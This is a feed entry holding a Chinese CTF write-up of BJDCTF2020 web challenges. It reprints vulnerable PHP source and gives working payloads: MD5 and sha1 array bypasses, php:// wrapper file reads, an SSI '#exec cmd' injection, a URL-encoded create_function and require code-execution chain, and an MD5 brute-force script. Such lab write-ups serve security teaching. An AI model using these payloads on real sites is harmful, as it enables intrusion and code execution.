    <link href="http://0clickjacking0.github.io/2020/02/08/BJDCTF2020%E5%A4%8D%E7%8E%B0/"/>
    <id>http://0clickjacking0.github.io/2020/02/08/BJDCTF2020复现/</id>
    <published>2020-02-08T04:59:43.000Z</published>
    <updated>2020-08-24T13:45:27.852Z</updated>
    
    <content type="html"><![CDATA[<p>由于不是本校学生，所以我在<a href="https://buuoj.cn/challenge" target="_blank" rel="noopener">buuctf</a>复现了一波</p><a id="more"></a><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>抓包后看到返回包有提示，如下</p><p><img src="http://images.xianyu123.club/20200824145311.png" alt="image-20200824145311443"></p><p>传入<code>password=ffifdyop</code>到达下一关</p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a = $GET[<span class="string">'a'</span>];</span><br><span class="line">$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br></pre></td></tr></table></figure><p>传入<code>a[]=1&amp;b[]=2</code>绕过</p><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>post传入<code>param1[]=1&amp;param2[]=2</code>得到flag</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p><code>.git</code>源码泄漏，用工具<code>Git_Extract</code>得到<code>index.php</code>的核心代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;%</span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先使用<code>php://input</code>输入流和<code>php://filter</code>过滤器进行读取</p><p>请求包</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?text=php://input&amp;file=php://filter/convert.base64-encode/resource=next.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 79240f88-1651-412e-a5ae-f80e1d0c144c.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 14</span><br><span class="line"></span><br><span class="line">I have a dream</span><br></pre></td></tr></table></figure><p>返回包</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: openresty</span><br><span class="line"><span class="attribute">Date</span>: Sat, 08 Feb 2020 04:56:41 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 432</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.6.40</span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;h1&gt;I have a dream&lt;/h1&gt;&lt;/br&gt;PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K</span><br></pre></td></tr></table></figure><p>base64解码后得到<code>next.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里第8行，<code>preg_replace</code>函数开启了<code>e</code>模式，根据php官网对e模式的描述如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果设置了这个被弃用的修饰符， preg_replace() 在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php 代码评估执行(eval 函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线(\)和 NULL 字符在 后向引用替换时会被用反斜线转义.</span><br></pre></td></tr></table></figure><p>虽然第二个参数没有可控的地方</p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>扫描后发现存在<code>index.php.swp</code>，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">function get_hash()&#123;</span><br><span class="line">$chars = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&apos;;</span><br><span class="line">$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times</span><br><span class="line">$content = uniqid().$random;</span><br><span class="line">return sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">***</span><br><span class="line">    if(isset($_POST[&apos;username&apos;]) and $_POST[&apos;username&apos;] != &apos;&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = &apos;6d0bc1&apos;;</span><br><span class="line">        if ( $admin == substr(md5($_POST[&apos;password&apos;]),0,6)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;[+] Welcome to manage system&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">            $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;;</span><br><span class="line">            $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">            $text = &apos;</span><br><span class="line">            ***</span><br><span class="line">            ***</span><br><span class="line">            &lt;h1&gt;Hello,&apos;.$_POST[&apos;username&apos;].&apos;&lt;/h1&gt;</span><br><span class="line">            ***</span><br><span class="line">***&apos;;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line">echo &quot;[!] Header  error ...&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;[!] Failed&apos;)&lt;/script&gt;&quot;;</span><br><span class="line">            </span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>比较简单的ssi注入漏洞，没有任何过滤，直接打就好了，具体可以参考我的这篇文章<a href="https://0clickjacking0.github.io/2019/09/13/ssi漏洞小结/">ssi漏洞小结</a></p><p>爆破md5的脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">list = string.digits+string.ascii_letters</span><br><span class="line">input_md5 = input(<span class="string">'请输入md5值：'</span>)</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> list:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> list:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> list:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> list:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> list:<span class="comment">#5位数</span></span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> list:  <span class="comment"># 6位数</span></span><br><span class="line">                        <span class="keyword">for</span> g <span class="keyword">in</span> list:  <span class="comment"># 7位数</span></span><br><span class="line">                            str4=(a+b+c+d+e+f+g)</span><br><span class="line">                            value = hashlib.md5(str4.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">                            value1 = value.hexdigest()</span><br><span class="line">                            <span class="comment">#print (value1)</span></span><br><span class="line">                            s4 = value1[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">                            <span class="comment"># print (s1)</span></span><br><span class="line">                            <span class="keyword">if</span> s4 == input_md5:<span class="comment">#写入从页面中获取6位数</span></span><br><span class="line">                                <span class="keyword">print</span> (str4)</span><br></pre></td></tr></table></figure><p>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2 &quot;--&gt;&amp;password=000e6wc</span><br></pre></td></tr></table></figure><p>然后访问返回头<code>Url_is_here</code>返回的链接即可得到flag</p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>在网页源代码发现注释<code>&lt;!-- GFXEIM3YFZYGQ4A= --&gt;</code>，base32解码后得到<code>1nD3x.php</code>，访问后得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">"1nD3x.php"</span>;</span><br><span class="line">$shana = $_GET[<span class="string">'shana'</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line">$arg = <span class="string">''</span>;</span><br><span class="line">$code = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You seem to want to do something bad?'</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/http|https/i'</span>, $_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^aqua_is_cute$/'</span>, $_GET[<span class="string">'debu'</span>]) &amp;&amp; $_GET[<span class="string">'debu'</span>] !== <span class="string">'aqua_is_cute'</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Neeeeee! Good Job!&lt;br&gt;"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'fxck you! What do you want to do ?!'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'fxck you! I hate English!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">'debu_debu_aqua'</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">"flag"</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Very good! you know my password. But what is flag?&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9]*$/isD'</span>, $code) || </span><br><span class="line">preg_match(<span class="string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    $code(<span class="string">''</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br><span class="line">This is a very simple challenge <span class="keyword">and</span> <span class="keyword">if</span> you solve it I will give you a flag. Good Luck!</span><br><span class="line">Aqua is the cutest five-year-old child in the world! Isn<span class="string">'t it ?</span></span><br></pre></td></tr></table></figure><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ol><li><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>是不会进行url解码的，所以我们只需要对过滤的内容进行url编码即可</li><li><code>/^aqua_is_cute$/</code>的绕过，直接在后面加<code>%0a</code>就可以绕过</li><li><code>$_REQUEST</code>这儿需要满足参数的值不能有字母，因为之前接收的参数为<code>$_GET</code>，所以我们只需要POST一些相同的参数，覆盖掉<code>$_GET</code>的参数就行了，这是因为<code>$_REQUEST</code>的解析是有一定顺序的，应该是先解析<code>$_GET</code>，再解析<code>$_POST</code>，这样我们就能绕过</li><li>sha1函数这里就是常规的数组绕过</li><li>最后<code>$code(&#39;&#39;, $arg);</code>这里可以用<code>create_function</code>来执行，因为<code>create_function</code>的自身缺陷，存在代码执行的绕过，所以我们可以绕过<code>create_function</code>来进行任意代码执行。</li></ol><p>因为这里<code>include &quot;flag.php&quot;;</code>，所以我们使用<code>get_defined_vars()</code>来返回所有已定义变量，然后发现，真正的flag并不在这个页面上</p><p><img src="http://images.xianyu123.club/20200824210640.png" alt="image-20200824210639904"></p><p>这样的话我们需要用<code>require</code>包含这个文件来读取，然后利用取反来构造，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(~(%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F))</span><br></pre></td></tr></table></figure><p>但是一直读取不到，后来网上搜了资料发现可以用require+伪协议读取，payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">requrie(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F</span><br><span class="line">))</span><br></pre></td></tr></table></figure><p>发现buu这里会删除flag，只能直接读取文件</p><p><img src="http://images.xianyu123.club/20200824214525.png" alt="image-20200824214525217"></p><p>完整的http构造如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://75a89160-5c3f-490e-b233-1dcf279fbbe8.node3.buuoj.cn/1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=%64%61%74%61%3a%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67[%61%72%67]=1;&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F</span><br><span class="line">));var_dump(get_defined_vars());//&amp;%66%6c%61%67[%63%6f%64%65]=create_function</span><br><span class="line"></span><br><span class="line">post数据如下：</span><br><span class="line">debu=2&amp;file=1&amp;passwd=2&amp;shana=1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;由于不是本校学生，所以我在&lt;a href=&quot;https://buuoj.cn/challenge&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;复现了一波&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>hgame2020-Level-Week3_Web_writeup</title>
    <link href="http://0clickjacking0.github.io/2020/02/04/hgame2020-Level-Week3-Web-writeup/"/>
    <id>http://0clickjacking0.github.io/2020/02/04/hgame2020-Level-Week3-Web-writeup/</id>
    <published>2020-02-04T04:28:22.000Z</published>
    <updated>2020-02-28T12:21:42.474Z</updated>
    
